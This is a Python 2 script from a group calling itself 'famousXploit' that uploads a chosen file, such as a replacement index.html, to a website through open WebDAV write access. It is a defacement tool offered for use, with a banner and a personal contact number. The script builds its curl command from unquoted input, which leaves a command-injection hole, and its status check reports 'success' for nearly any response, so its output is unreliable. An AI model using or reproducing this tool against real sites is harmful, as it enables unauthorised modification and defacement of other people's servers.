import requests
import sys
import os
import string
import time

# colors

m = '\033[91;1m'
h = '\033[92;1m'
k = '\033[93;1m'

banner = h+''' __     __ _____ _____  _____  _____ _   _
|  | ^ |  |  ___|     \|  _  \|  _  | | | |
|  |/ \|  | |___|  @  /| | |  | | | | | | |
|    ^    | |___|  @  \| |_|  |  _  \ |_| /
|___| |___|_____|_____/|_____/|_| |_|\___/


 _____________________________________________________
|	             Contact Us			      |
|_____________________________________________________|
|Creator Script : heri setyawan			      |
|WA		: 083853797950			      |
|Alamat		: -				      |
|Team		: famousXploit			      |
|nick		: aku bukan hacker jadi ga punya nick |
|_____________________________________________________|

\033[93;1mExamples : python2 webdav.py http://www.webdav.com /sdcard/index.html
'''
os.system('clear')
print banner

def progress(param):
	total = 100
	bar = 30
	for i in range(total):
		len 	= int(round(bar * (i + 1) / float(total)))
		line 	= '#'*len + '=' * (bar - len)
		precent = round(100.0 * (i + 1) / float(total), 2)
		print '\r'+m+param+h+' : [%s] %s Completed' % (line, precent)
		sys.stdout.flush()
		time.sleep(0.09)
def check():
	url  	= sys.argv[1]+'/'
	file 	= sys.argv[2]
	target 	= url+file
	if not url.startswith('http'):
		target = 'http://'+target
	print m+"[*] "+h+"Checking on target : "+target+'...'
	time.sleep(1)
	progress('Checking')
	os.system('clear')
	print banner
	req	= requests.get(target)
	if req.status_code == 200:
		print '['+m+'*'+h+'] File yang anda masukan sudah ada/ada file yang sama'
		confirm = raw_input('Apakah anda ingin mengganti script [y/n] : ')
		if confirm == 'y' or confirm == 'Y':
			print ' '
			print "!!! silakan ulangi cara yang sama"
			sys.exit()
		elif confirm == 'n' or confirm == 'N':
			print '[*] please, Wait for uploading data to target...'
			execute()

	else:
		print '[*] please, Wait for uploading data to target...'
		execute()
def execute():
	host = sys.argv[1] + '/'
	file = sys.argv[2]
	with open(file, 'rb') as read:
		data = read.read()
	script = data
	target = host+file
	print '[*] your script : '+file
	print '[*] Uploading %d bytes' % (len(script))
	progress('Uploading')
	os.system('curl -T '+file+' '+host)
	req = requests.get(target)
	if req.status_code <= 200 or req.status_code >= 300:
		print '[*] Uploading success........'
		print 'check on : '+target
	else:
		print '[*] IPloading Lose...........'
try:
	if len(sys.argv) != 3:
		os.system('clear')
		print banner
	else:
		check()
except requests.ConnectionError, e:
	os.system('clear')
	print banner
	print m+"[*]"+h+" nothing connection to internet....."
